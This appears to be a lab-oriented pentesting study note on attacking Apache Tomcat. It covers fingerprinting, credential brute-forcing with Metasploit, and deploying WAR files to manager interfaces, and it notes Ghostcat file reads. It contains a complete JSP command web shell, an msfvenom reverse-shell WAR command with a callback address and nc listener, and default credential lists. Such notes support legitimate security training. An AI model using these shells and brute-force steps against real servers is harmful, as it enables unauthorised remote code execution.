# Tomcat – Discovery and Attacking

## Overview

Apache Tomcat is an open-source web server/application server commonly used to host Java applications.

It was originally designed for:

- Java Servlets
- Java Server Pages (JSP)

It is now widely used by:

- Spring-based applications
- Java web apps
- enterprise tooling
- build/deployment ecosystems such as Gradle-backed applications

According to the notes, BuiltWith data showed:

- over **220,000 live Tomcat websites**
- over **904,000 websites** have used Tomcat at some point
- **1.22%** of the top 1 million sites use Tomcat
- **3.8%** of the top 100k sites use Tomcat
- Tomcat ranks around **#13** by market share among web servers

Organisations mentioned in the notes:

- Alibaba
- USPTO
- American Red Cross
- LA Times

## Why it matters

Tomcat is especially valuable during:

- **internal pentests**
- occasionally **external pentests**

It often shows up as a **high-value target** because:

- manager interfaces may be exposed
- default or weak credentials are common
- a successful login can often be turned into **RCE**
- Tomcat sometimes runs as a highly privileged user

Think of Tomcat as a Java app host that often comes with an admin panel capable of deploying code for you.

---

# 1. Discovery / Footprinting

Tomcat can often be identified from:

- HTTP response headers
- default error pages
- `/docs`
- `/examples`
- `/manager`
- `/host-manager`
- service/version scans
- AJP port exposure (`8009`)

## Invalid page / error page fingerprinting

If Tomcat is behind a reverse proxy, requesting a bad path may still leak the server/version.

Example idea:

```text
http://app-dev.inlanefreight.local:8080/invalid
```

In the notes, this revealed:

- **Tomcat 9.0.30**

This may not always work if:

- custom error pages are used
- proxy hides upstream headers

---

# 2. `/docs` Fingerprinting

A second very common fingerprint is the built-in documentation page.

## Example

```bash
curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat
```

Example output from the notes:

```html
<title>Apache Tomcat 9 (9.0.30) - Documentation Index</title>
```

## Why this matters

If `/docs` is present, it often gives:

- exact version
- strong proof of Tomcat
- a sign of incomplete hardening

---

# 3. Typical Tomcat Folder Structure

A default Tomcat install often looks like:

```text
├── bin
├── conf
│   ├── catalina.policy
│   ├── catalina.properties
│   ├── context.xml
│   ├── tomcat-users.xml
│   ├── tomcat-users.xsd
│   └── web.xml
├── lib
├── logs
├── temp
├── webapps
│   ├── manager
│   │   ├── images
│   │   ├── META-INF
│   │   └── WEB-INF
│   │       └── web.xml
│   └── ROOT
│       └── WEB-INF
└── work
    └── Catalina
        └── localhost
```

## High-value files/directories

### `conf/tomcat-users.xml`
Stores Tomcat user accounts and assigned roles.

### `webapps/`
Default web root containing deployed applications.

### `WEB-INF/web.xml`
Important deployment descriptor for each web app.

### `WEB-INF/classes/`
Compiled Java classes containing business logic.

### `WEB-INF/lib/`
Libraries used by the application.

---

# 4. Tomcat Webapp Structure

A typical application under `webapps` may look like:

```text
webapps/customapp
├── images
├── index.jsp
├── META-INF
│   └── context.xml
├── status.xsd
└── WEB-INF
    ├── jsp
    │   └── admin.jsp
    ├── web.xml
    ├── lib
    │   └── jdbc_drivers.jar
    └── classes
        └── AdminServlet.class
```

## Important points

### `index.jsp`
JSP entry point, similar in role to a PHP page.

### `WEB-INF/web.xml`
Maps routes to classes/servlets.

### `WEB-INF/classes`
Contains compiled `.class` files, often interesting for:

- app logic
- auth handling
- sensitive strings
- creds
- endpoints

### `WEB-INF/lib`
Contains application libraries/JARs.

---

# 5. `web.xml` Matters

The `WEB-INF/web.xml` file is one of the most useful files in a Tomcat app.

Example from the notes:

```xml
<web-app>
  <servlet>
    <servlet-name>AdminServlet</servlet-name>
    <servlet-class>com.inlanefreight.api.AdminServlet</servlet-class>
  </servlet>

  <servlet-mapping>
    <servlet-name>AdminServlet</servlet-name>
    <url-pattern>/admin</url-pattern>
  </servlet-mapping>
</web-app>
```

## What this tells you

- servlet class:
  - `com.inlanefreight.api.AdminServlet`
- mapped route:
  - `/admin`

Class path on disk:

```text
classes/com/inlanefreight/api/AdminServlet.class
```

## Why it matters

If you get LFI or AJP file-read access, `web.xml` is a gold mine for:

- hidden routes
- servlet names
- app structure
- interesting class names
- internal attack surface

---

# 6. `tomcat-users.xml` and Roles

Tomcat uses `tomcat-users.xml` to define users and roles.

Example from the notes:

```xml
<role rolename="manager-gui" />
<user username="tomcat" password="tomcat" roles="manager-gui" />

<role rolename="admin-gui" />
<user username="admin" password="admin" roles="manager-gui,admin-gui" />
```

## Important Tomcat roles

- `manager-gui`
- `manager-script`
- `manager-jmx`
- `manager-status`
- `admin-gui`

## Why this matters

These roles control access to:

- `/manager/html`
- status pages
- JMX proxy
- admin functions

If valid creds exist for `manager-gui`, you can often deploy a WAR and get RCE.

---

# 7. Enumeration

After confirming Tomcat, the next priority is usually:

- `/manager`
- `/host-manager`
- `/docs`
- `/examples`

## Gobuster example

```bash
gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
```

Example findings from the notes:

- `/docs`
- `/examples`
- `/manager`

These are all very strong Tomcat indicators.

---

# 8. Primary Attack Path

If one of these endpoints is accessible:

- `/manager/html`
- `/host-manager/html`

then the main question becomes:

**Can we log in?**

If yes, Tomcat often turns into very straightforward RCE via:

- WAR upload
- JSP shell deployment
- reverse shell deployment

---

# 9. Tomcat Manager Brute Force

The notes used Metasploit:

```text
auxiliary/scanner/http/tomcat_mgr_login
```

This is a practical and fast way to test known/default Tomcat creds.

## Example configuration

```bash
set VHOST web01.inlanefreight.local
set RPORT 8180
set STOP_ON_SUCCESS true
set RHOSTS 10.129.201.58
show options
run
```

## Important note

As the notes mention, you often need both:

- `RHOSTS`
- `VHOST`

to target the correct virtual host.

## Result from the notes

Successful credentials:

```text
tomcat : admin
```

That is a classic Tomcat-style weakness.

---

# 10. Troubleshooting with a Proxy

If a tool is misbehaving, proxy it through Burp/ZAP to see what it is doing.

## Example Metasploit proxy setting

```bash
set PROXIES HTTP:127.0.0.1:8080
```

This lets you inspect:

- auth headers
- request paths
- whether Basic Auth is formed correctly
- response codes
- CSRF handling
- redirects

The notes demonstrated decoding a Basic Auth header:

```bash
echo YWRtaW46dmFncmFudA== | base64 -d
```

Output:

```text
admin:vagrant
```

That is a useful debugging habit.

---

# 11. Python Brute Force Script

The notes also included a simple custom Python brute force script using `requests.get(..., auth=(u, p))`.

## Why that matters

It reinforces that Tomcat Manager auth is often just:

- HTTP Basic Auth
- straightforward to script
- easy to test manually if needed

The script takes:

- base URL
- path (`/manager` or `/host-manager`)
- user list
- password list

and checks for `200 OK`.

That is a good fallback if you do not want to use Metasploit.

---

# 12. Tomcat Manager – WAR Upload

This is the most important built-in Tomcat attack path in the notes.

If you have valid manager credentials, the manager GUI lets you deploy a WAR.

A **WAR** (Web Application Archive) is a packaged Java web app.

If you upload a WAR containing a malicious JSP shell, Tomcat will deploy it for you.

## Manager page

```text
http://web01.inlanefreight.local:8180/manager/html
```

After login, you can upload a WAR from the GUI.

---

# 13. Building a JSP Web Shell WAR

The notes used a JSP command shell.

## Example JSP shell

```jsp
<%@ page import="java.util.*,java.io.*"%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr);
                disr = dis.readLine();
        }
}
%>
</pre>
</BODY></HTML>
```

## Package into WAR

```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp
```

## Upload

Use the Tomcat Manager **Deploy** function to upload `backup.war`.

Tomcat extracts and deploys it as a new application:

```text
/backup/
```

## Access shell

The deployed app path alone may 404:

```text
/backup/
```

You need the JSP file:

```text
/backup/cmd.jsp
```

## Example execution

```bash
curl "http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id"
```

Example output:

```text
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```

That confirms RCE as the `tomcat` user.

---

# 14. msfvenom WAR Payload

Instead of building a manual JSP shell, you can generate a WAR with `msfvenom`.

## Example

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
```

Then upload it through Tomcat Manager.

## Listener

```bash
nc -lnvp 4443
```

## Result

When the deployed application is triggered, you get a reverse shell.

Example identity from the notes:

```text
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```

This is a very fast path from weak creds to shell.

---

# 15. Cleanup

After a WAR upload, Tomcat usually stores:

- the uploaded `.war`
- an extracted application directory

Example location from the notes:

```text
/opt/tomcat/apache-tomcat-10.0.10/webapps
```

You may see:

- `backup.war`
- `backup/`
- `cmd.jsp`
- `META-INF`

## Best cleanup step

Use the **Undeploy** button in Tomcat Manager.

That usually removes:

- the WAR
- the extracted application directory

Still document:

- filename
- upload path
- deployed app name
- whether cleanup succeeded

---

# 16. Quick Note on Web Shell Hygiene

The notes made a very good operational point.

When you upload a shell, especially externally:

- randomise the file/app name
- use non-obvious parameters
- restrict by source IP if possible
- optionally password protect it
- remove it as soon as possible

You do not want a third party finding your shell during the assessment.

---

# 17. Ghostcat (CVE-2020-1938)

Ghostcat is one of the best-known Tomcat issues.

## Type
- unauthenticated file-read / LFI-style issue
- tied to **AJP**
- often described as a misconfiguration-related issue

## Affected versions (from the notes)
Versions before:

- **9.0.31**
- **8.5.51**
- **7.0.100**

## Why it matters

If AJP is exposed, you may be able to read files from within the web application.

The AJP service usually runs on:

```text
8009
```

---

# 18. Detecting AJP Exposure

## Nmap example

```bash
nmap -sV -p 8009,8080 app-dev.inlanefreight.local
```

Example output:

```text
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat 9.0.30
```

This is a classic Ghostcat setup:

- Tomcat version in affected range
- AJP exposed on `8009`

---

# 19. Ghostcat File Read

The notes used a PoC:

```bash
python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml
```

## Result

It successfully read:

```text
WEB-INF/web.xml
```

## Important limitation

The notes mention the exploit could only read files/folders within the webapps context.

So:

- `WEB-INF/web.xml` → good candidate
- `/etc/passwd` → not accessible via this path

## Why `WEB-INF/web.xml` is still valuable

It can reveal:

- servlet mappings
- app structure
- hidden routes
- app names
- internal attack surface

In some installs, you may also be able to read additional sensitive application files under the deployed webapp.

---

# 20. Discovery-to-Attack Workflow

A practical Tomcat workflow based on the notes:

## Step 1 – confirm Tomcat

Check:

- invalid page headers
- `/docs`
- `/examples`
- service scan
- EyeWitness/Aquatone hints

## Step 2 – enumerate interesting paths

Look for:

- `/manager`
- `/manager/html`
- `/host-manager`
- `/docs`
- `/examples`

## Step 3 – brute force manager creds

Try:

- `tomcat:tomcat`
- `admin:admin`
- `tomcat:admin`
- default lists
- light brute forcing

## Step 4 – if creds work, upload WAR

Choose:

- manual JSP WAR
- `msfvenom` WAR

## Step 5 – verify code execution

Example:

```bash
curl "http://target:port/app/cmd.jsp?cmd=id"
```

## Step 6 – if manager access fails, check Ghostcat

If version vulnerable and `8009` open:

- try reading `WEB-INF/web.xml`
- pivot from file disclosure into deeper app enumeration

---

# 21. Useful Commands

## Fingerprint docs page

```bash
curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat
```

## Gobuster

```bash
gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
```

## Metasploit Tomcat Manager brute force

```bash
use auxiliary/scanner/http/tomcat_mgr_login
set VHOST web01.inlanefreight.local
set RPORT 8180
set STOP_ON_SUCCESS true
set RHOSTS 10.129.201.58
run
```

## Decode Basic Auth sample

```bash
echo YWRtaW46dmFncmFudA== | base64 -d
```

## Build WAR from JSP shell

```bash
zip -r backup.war cmd.jsp
```

## Access deployed JSP shell

```bash
curl "http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id"
```

## msfvenom WAR

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
```

## Listener

```bash
nc -lnvp 4443
```

## Ghostcat scan

```bash
nmap -sV -p 8009,8080 app-dev.inlanefreight.local
```

## Ghostcat file read

```bash
python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml
```

---

# 22. Key Takeaways

- Tomcat is a high-value target because exposed manager access often means immediate RCE
- `/docs`, `/manager`, `/examples`, and response headers are strong fingerprints
- `tomcat-users.xml` explains the role model and default-style accounts often show up in practice
- `WEB-INF/web.xml` is one of the most valuable files for understanding the app
- weak/default Manager credentials are common enough that they should always be tested
- WAR upload through Tomcat Manager is one of the cleanest built-in RCE paths
- Ghostcat is valuable when AJP on `8009` is exposed and the Tomcat version is vulnerable
- Tomcat frequently runs as a privileged service account, so even a basic foothold can become very powerful

---

# Tags

#tomcat
#jsp
#war
#manager
#host-manager
#ghostcat
#cve-2020-1938
#ajp
#java
#attacking-common-apps
#pentesting
#ctf
#obsidian